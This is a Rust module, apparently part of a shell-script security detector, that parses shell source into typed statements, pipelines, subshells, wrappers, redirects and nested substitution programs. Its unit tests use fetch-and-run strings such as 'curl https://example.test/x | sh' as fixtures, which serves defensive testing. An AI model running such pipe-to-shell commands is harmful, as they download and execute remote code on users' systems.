//! Bounded typed structure for one shell logical unit.
//!
//! This is the first Stage B layer from `docs/detect-rs-maintenance-plan.md`.
//! The existing detector families still consume lexer tokens, but the tokens
//! now have one typed structural owner at the shell boundary. Compound groups
//! remain nodes of their own instead of being mistaken for ordinary argv.

use super::budget::MAX_SHELL_ANALYSIS_DEPTH;
use super::command::{
    ScriptCommand, command_arguments, command_basename, env_split_string_command,
    is_env_assignment, is_redirect_operator, segment_commands, skip_command_prefixes,
    skip_wrapper_options, statement_outcomes,
};
use super::lexer::{ShellToken, SubstKind};
use super::syntax::{
    GroupKind, Outcomes, conditional_statements, matching_group_close, pipeline_negated,
    pipeline_segments,
};

/// The list operator that controls whether a statement may run.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(in crate::detect) enum Guard {
    /// The first statement in a list has no preceding operator.
    Unconditional,
    /// A statement following `;`.
    Sequence,
    /// A statement following `&&`.
    And,
    /// A statement following `||`.
    Or,
    /// A statement following `&`.
    Background,
}

impl Guard {
    fn from_operator(operator: Option<&str>) -> Self {
        match operator {
            None => Self::Unconditional,
            Some(";") => Self::Sequence,
            Some("&&") => Self::And,
            Some("||") => Self::Or,
            Some("&") => Self::Background,
            // `conditional_statements` only emits the operators above. Keep
            // malformed/future input represented as an unconditional path.
            Some(_) => Self::Unconditional,
        }
    }
}

/// The known runtime provenance of a shell word.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(in crate::detect) enum WordProvenance {
    Static,
    ParameterExpansion,
    CommandSubstitution,
    ProcessSubstitution,
    ArithmeticExpansion,
    Mixed,
}

/// A word's best-known runtime value and how that value was produced.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(in crate::detect) struct Word {
    pub(in crate::detect) value: String,
    pub(in crate::detect) provenance: WordProvenance,
    /// Child shell programs owned by command/process substitutions in this
    /// word. Arithmetic expansions keep no shell child because their words
    /// are expressions, not command positions.
    pub(in crate::detect) substitutions: Vec<ExecutedSubstitution>,
}

/// A command or process substitution that executes shell text while the
/// containing word is expanded. The optional program is absent only when the
/// shared nesting ceiling prevents another parse; the source remains
/// available to the bounded compatibility fallback.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(in crate::detect) struct ExecutedSubstitution {
    pub(in crate::detect) kind: SubstKind,
    pub(in crate::detect) source: String,
    pub(in crate::detect) program: Option<Box<ShellProgram>>,
}

/// One redirection at the command node's own nesting depth.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(in crate::detect) struct Redirect {
    pub(in crate::detect) operator: String,
    pub(in crate::detect) target: Option<Word>,
}

/// A wrapper invocation retained around the command it launches. Keeping
/// wrappers typed avoids losing the command-position distinction when the IR
/// replaces the current token walks.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(in crate::detect) struct CommandWrapper {
    pub(in crate::detect) head: String,
    pub(in crate::detect) args: Vec<Word>,
}

/// A simple command after command-position and wrapper analysis.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(in crate::detect) struct Command {
    pub(in crate::detect) head: String,
    pub(in crate::detect) args: Vec<Word>,
    pub(in crate::detect) redirects: Vec<Redirect>,
    pub(in crate::detect) wrappers: Vec<CommandWrapper>,
    /// Shell text executed by a static `-c`/`eval` invocation. Keeping the
    /// parsed child beside its source lets detector layers share one parse.
    pub(in crate::detect) body: Option<ExecutedBody>,
}

/// A statically known shell body and its bounded child program.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(in crate::detect) struct ExecutedBody {
    pub(in crate::detect) source: String,
    pub(in crate::detect) program: Option<Box<ShellProgram>>,
}

/// A command node in a pipeline. Compound commands are explicit so their
/// bodies cannot be flattened into the surrounding command's argv.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(in crate::detect) enum CommandNode {
    Simple(Command),
    Subshell {
        body: Vec<Statement>,
        redirects: Vec<Redirect>,
    },
    BraceGroup {
        body: Vec<Statement>,
        redirects: Vec<Redirect>,
    },
    Arithmetic {
        expression: Vec<Word>,
        redirects: Vec<Redirect>,
    },
    /// Unmatched or otherwise unsupported command-position syntax is kept as
    /// data rather than being guessed into a runnable command.
    Opaque {
        words: Vec<Word>,
        redirects: Vec<Redirect>,
    },
}

/// One pipeline and its command nodes.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(in crate::detect) struct Pipeline {
    pub(in crate::detect) negated: bool,
    pub(in crate::detect) commands: Vec<CommandNode>,
}

/// One conditional-list statement.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(in crate::detect) struct Statement {
    pub(in crate::detect) guard: Guard,
    /// Whether at least one status path reaches this statement. Keeping this
    /// beside the typed guard lets detector walks skip statically dead
    /// branches without returning to raw control operators.
    pub(in crate::detect) reachable: bool,
    pub(in crate::detect) pipelines: Vec<Pipeline>,
}

/// A logical shell unit and its parsed token stream.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(in crate::detect) struct LogicalUnit {
    pub(in crate::detect) start_line: u32,
    source: String,
    tokens: Vec<ShellToken>,
    pub(in crate::detect) statements: Vec<Statement>,
}

impl LogicalUnit {
    pub(in crate::detect) fn source(&self) -> &str {
        &self.source
    }

    pub(in crate::detect) fn tokens(&self) -> &[ShellToken] {
        &self.tokens
    }
}

/// Parsed shell logical units. Its size is bounded by the already bounded
/// source entry and the existing logical-unit/tokenization pass.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub(in crate::detect) struct ShellProgram {
    pub(in crate::detect) units: Vec<LogicalUnit>,
}

impl ShellProgram {
    /// Parse the source units emitted by the shell source assembler.
    pub(in crate::detect) fn from_units(units: Vec<(u32, String)>) -> Self {
        Self {
            units: units
                .into_iter()
                .map(|(start_line, source)| parse_unit(start_line, source))
                .collect(),
        }
    }

    pub(in crate::detect) fn units(&self) -> &[LogicalUnit] {
        &self.units
    }
}

fn parse_unit(start_line: u32, source: String) -> LogicalUnit {
    parse_unit_with_depth(start_line, source, 0)
}

fn parse_unit_with_depth(start_line: u32, source: String, depth: usize) -> LogicalUnit {
    let tokens = super::lexer::tokenize(&source);
    let statements = parse_statements(&tokens, depth);
    LogicalUnit {
        start_line,
        source,
        tokens,
        statements,
    }
}

fn child_program(source: &str, depth: usize) -> Option<Box<ShellProgram>> {
    (depth < MAX_SHELL_ANALYSIS_DEPTH as usize).then(|| {
        Box::new(ShellProgram {
            units: vec![parse_unit_with_depth(1, source.to_owned(), depth)],
        })
    })
}

fn parse_statements(tokens: &[ShellToken], depth: usize) -> Vec<Statement> {
    let mut outcomes = Outcomes::ANY;
    conditional_statements(tokens)
        .into_iter()
        .map(|(statement, guard)| {
            let reachable = outcomes.executes(guard);
            let commands: Vec<CommandNode> = pipeline_segments(statement)
                .into_iter()
                .filter(|segment| !segment.is_empty())
                .map(|segment| parse_command_node(segment, depth))
                .collect();
            let parsed = Statement {
                guard: Guard::from_operator(guard),
                reachable,
                pipelines: if commands.is_empty() {
                    Vec::new()
                } else {
                    vec![Pipeline {
                        negated: pipeline_negated(statement),
                        commands,
                    }]
                },
            };
            outcomes = outcomes.advance(guard, statement_outcomes(statement));
            parsed
        })
        .collect()
}

fn parse_command_node(segment: &[ShellToken], depth: usize) -> CommandNode {
    if let Some((open, kind)) = compound_open(segment) {
        let Some(close) = matching_group_close(segment, open) else {
            return opaque_node(segment, depth);
        };
        if depth >= MAX_SHELL_ANALYSIS_DEPTH as usize {
            return opaque_node(segment, depth);
        }
        let redirects = redirects_at_depth_zero(segment, depth);
        return match kind {
            GroupKind::List if segment[open].operator() == Some("{") => CommandNode::BraceGroup {
                body: parse_statements(&segment[open + 1..close], depth + 1),
                redirects,
            },
            GroupKind::List => CommandNode::Subshell {
                body: parse_statements(&segment[open + 1..close], depth + 1),
                redirects,
            },
            GroupKind::Arithmetic => CommandNode::Arithmetic {
                expression: segment[open + 1..close]
                    .iter()
                    .filter_map(|token| word_from_token_at_depth(token, depth + 1))
                    .collect(),
                redirects,
            },
        };
    }

    let commands = segment_commands(segment);
    let Some(last) = commands.last() else {
        return opaque_node(segment, depth);
    };
    let args = command_args(segment, last, depth).unwrap_or_else(|| {
        last.args
            .iter()
            .zip(last.arg_dynamic.iter().copied())
            .map(|(value, dynamic)| word_from_value(value, dynamic))
            .collect()
    });
    let wrappers = commands[..commands.len() - 1]
        .iter()
        .map(command_wrapper)
        .collect();
    let body = super::interpreter::static_command_body(last).map(|source| ExecutedBody {
        program: child_program(&source, depth + 1),
        source,
    });
    CommandNode::Simple(Command {
        head: last.head.to_owned(),
        args,
        redirects: redirects_at_depth_zero(segment, depth),
        wrappers,
        body,
    })
}

/// Find a compound opener after prefixes that belong to the surrounding
/// command (`VAR=1`, `!`, and leading redirects).
fn compound_open(segment: &[ShellToken]) -> Option<(usize, GroupKind)> {
    let mut index = 0usize;
    while let Some(token) = segment.get(index) {
        match token {
            ShellToken::Word { value, .. } if value == "!" || is_env_assignment(value) => {
                index += 1
            }
            ShellToken::Operator(operator) if is_redirect_operator(operator) => {
                index += 1;
                if matches!(segment.get(index), Some(ShellToken::Word { .. })) {
                    index += 1;
                }
            }
            ShellToken::Operator(operator) => {
                let kind = match operator.as_str() {
                    "(" | "{" => GroupKind::List,
                    "((" => GroupKind::Arithmetic,
                    _ => return None,
                };
                return Some((index, kind));
            }
            ShellToken::Word { .. } => return None,
        }
    }
    None
}

/// Collect redirects that belong to the command node itself. Redirects in a
/// nested compound body are left with that body's node.
fn redirects_at_depth_zero(segment: &[ShellToken], depth: usize) -> Vec<Redirect> {
    let mut redirects = Vec::new();
    let mut nesting = 0i32;
    let mut index = 0usize;
    while index < segment.len() {
        match &segment[index] {
            ShellToken::Operator(operator) => match operator.as_str() {
                "(" | "{" | "((" => nesting += 1,
                ")" | "}" | "))" => nesting = (nesting - 1).max(0),
                operator if nesting == 0 && is_redirect_operator(operator) => {
                    redirects.push(Redirect {
                        operator: operator.to_owned(),
                        target: segment.get(index + 1).and_then(|token| {
                            word_from_token_at_depth(token, depth.max(0) as usize)
                        }),
                    });
                    index += 1; // the target is data, not another redirect
                }
                _ => {}
            },
            ShellToken::Word { .. } => {}
        }
        index += 1;
    }
    redirects
}

/// Recover the final command's actual token start so its arguments retain
/// full substitution provenance. Wrapper parsing remains delegated to the
/// existing command-position model during this compatibility slice.
fn command_start(segment: &[ShellToken]) -> Option<usize> {
    let mut index = 0usize;
    skip_command_prefixes(segment, &mut index);
    loop {
        let head = segment.get(index).and_then(ShellToken::word)?;
        let basename = command_basename(head);
        if !matches!(
            basename,
            "sudo" | "pkexec" | "doas" | "command" | "env" | "exec" | "time"
        ) {
            return Some(index);
        }
        index += 1;
        if basename == "env" && env_split_string_command(segment, index).is_some() {
            return None;
        }
        if !skip_wrapper_options(basename, segment, &mut index) {
            return None;
        }
    }
}

fn command_args(
    segment: &[ShellToken],
    command: &ScriptCommand<'_>,
    depth: usize,
) -> Option<Vec<Word>> {
    let start = command_start(segment)?;
    let arguments = command_arguments(segment, start + 1);
    if arguments.len() != command.args.len() {
        return None;
    }
    let mut args = Vec::with_capacity(arguments.len());
    let mut index = start + 1;
    while index < segment.len() {
        match &segment[index] {
            ShellToken::Operator(operator) if is_redirect_operator(operator) => {
                index += 1;
                if matches!(segment.get(index), Some(ShellToken::Word { .. })) {
                    index += 1;
                }
            }
            ShellToken::Word { .. } => {
                args.push(word_from_token_at_depth(&segment[index], depth).expect("word token"));
                index += 1;
            }
            ShellToken::Operator(_) => index += 1,
        }
    }
    Some(args)
}

fn command_wrapper(command: &ScriptCommand<'_>) -> CommandWrapper {
    CommandWrapper {
        head: command.head.to_owned(),
        args: command
            .args
            .iter()
            .zip(command.arg_dynamic.iter().copied())
            .map(|(value, dynamic)| word_from_value(value, dynamic))
            .collect(),
    }
}

fn opaque_node(segment: &[ShellToken], depth: usize) -> CommandNode {
    CommandNode::Opaque {
        words: segment
            .iter()
            .filter_map(|token| word_from_token_at_depth(token, depth))
            .collect(),
        redirects: redirects_at_depth_zero(segment, depth),
    }
}

fn word_from_token_at_depth(token: &ShellToken, depth: usize) -> Option<Word> {
    let ShellToken::Word {
        value,
        substitutions,
        dynamic,
        ..
    } = token
    else {
        return None;
    };
    let provenance = if !dynamic {
        WordProvenance::Static
    } else if substitutions.len() != 1 {
        if substitutions.is_empty() {
            WordProvenance::ParameterExpansion
        } else {
            WordProvenance::Mixed
        }
    } else {
        match substitutions[0].kind {
            SubstKind::Command => WordProvenance::CommandSubstitution,
            SubstKind::Process => WordProvenance::ProcessSubstitution,
            SubstKind::Arithmetic => WordProvenance::ArithmeticExpansion,
        }
    };
    let substitutions = substitutions
        .iter()
        .map(|substitution| ExecutedSubstitution {
            kind: substitution.kind,
            source: substitution.inner.clone(),
            program: match substitution.kind {
                SubstKind::Command | SubstKind::Process => {
                    child_program(&substitution.inner, depth + 1)
                }
                SubstKind::Arithmetic => None,
            },
        })
        .collect();
    Some(Word {
        value: value.clone(),
        provenance,
        substitutions,
    })
}

fn word_from_value(value: &str, dynamic: bool) -> Word {
    Word {
        value: value.to_owned(),
        provenance: if dynamic {
            WordProvenance::Mixed
        } else {
            WordProvenance::Static
        },
        substitutions: Vec::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::{Command, CommandNode, Guard, ShellProgram, Word, WordProvenance};
    use crate::detect::shell::lexer::SubstKind;

    #[test]
    fn parses_guards_pipelines_and_compounds_without_flattening() {
        let program = ShellProgram::from_units(vec![(
            7,
            "false && curl https://example.test/x | sh; (echo safe; wget https://example.test/y)\n"
                .to_owned(),
        )]);
        let unit = &program.units()[0];
        assert_eq!(unit.start_line, 7);
        let statements: Vec<_> = unit
            .statements
            .iter()
            .filter(|statement| !statement.pipelines.is_empty())
            .collect();
        assert_eq!(statements.len(), 3);
        assert_eq!(statements[0].guard, Guard::Unconditional);
        assert_eq!(statements[0].pipelines[0].commands.len(), 1);
        assert_eq!(statements[1].guard, Guard::And);
        assert_eq!(statements[1].pipelines[0].commands.len(), 2);
        assert!(!statements[1].pipelines[0].negated);
        assert_eq!(statements[2].guard, Guard::Sequence);
        assert!(matches!(
            statements[2].pipelines[0].commands[0],
            CommandNode::Subshell { .. }
        ));
    }

    #[test]
    fn retains_word_provenance_and_redirect_targets() {
        let program = ShellProgram::from_units(vec![(
            1,
            "curl \"$(printf url)\" <(cat input) > output; echo $NAME\n".to_owned(),
        )]);
        let unit = &program.units()[0];
        let CommandNode::Simple(command) = &unit.statements[0].pipelines[0].commands[0] else {
            panic!("expected simple command");
        };
        assert_eq!(
            command.args[0].provenance,
            WordProvenance::CommandSubstitution
        );
        assert_eq!(
            command.args[1].provenance,
            WordProvenance::ProcessSubstitution
        );
        assert_eq!(command.redirects[0].operator, ">");
        assert_eq!(
            command.redirects[0]
                .target
                .as_ref()
                .expect("redirect target")
                .value,
            "output"
        );
        let CommandNode::Simple(echo) = &unit.statements[1].pipelines[0].commands[0] else {
            panic!("expected simple command");
        };
        assert_eq!(echo.args[0].provenance, WordProvenance::ParameterExpansion);
    }

    #[test]
    fn owns_static_bodies_and_executed_substitution_programs() {
        let program = ShellProgram::from_units(vec![(
            1,
            "sh -c 'curl https://example.test/body | sh'; echo \"$(wget https://example.test/sub)\" <(curl https://example.test/process)"
                .to_owned(),
        )]);
        let unit = &program.units()[0];

        let CommandNode::Simple(interpreter) = &unit.statements[0].pipelines[0].commands[0] else {
            panic!("expected static-body command");
        };
        let body = interpreter.body.as_ref().expect("owned shell body");
        assert_eq!(body.source, "curl https://example.test/body | sh");
        let body_unit = &body.program.as_ref().expect("parsed child program").units()[0];
        assert_eq!(body_unit.statements[0].pipelines[0].commands.len(), 2);

        let CommandNode::Simple(echo) = &unit.statements[1].pipelines[0].commands[0] else {
            panic!("expected substitution command");
        };
        assert_eq!(echo.args.len(), 2);
        assert_eq!(echo.args[0].substitutions.len(), 1);
        assert_eq!(echo.args[0].substitutions[0].kind, SubstKind::Command);
        assert_eq!(
            echo.args[0].substitutions[0]
                .program
                .as_ref()
                .expect("command substitution program")
                .units()[0]
                .statements[0]
                .pipelines[0]
                .commands[0],
            CommandNode::Simple(Command {
                head: "wget".to_owned(),
                args: vec![Word {
                    value: "https://example.test/sub".to_owned(),
                    provenance: WordProvenance::Static,
                    substitutions: Vec::new(),
                }],
                redirects: Vec::new(),
                wrappers: Vec::new(),
                body: None,
            })
        );
        assert_eq!(echo.args[1].substitutions.len(), 1);
        assert_eq!(echo.args[1].substitutions[0].kind, SubstKind::Process);
        assert!(echo.args[1].substitutions[0].program.is_some());
    }
}
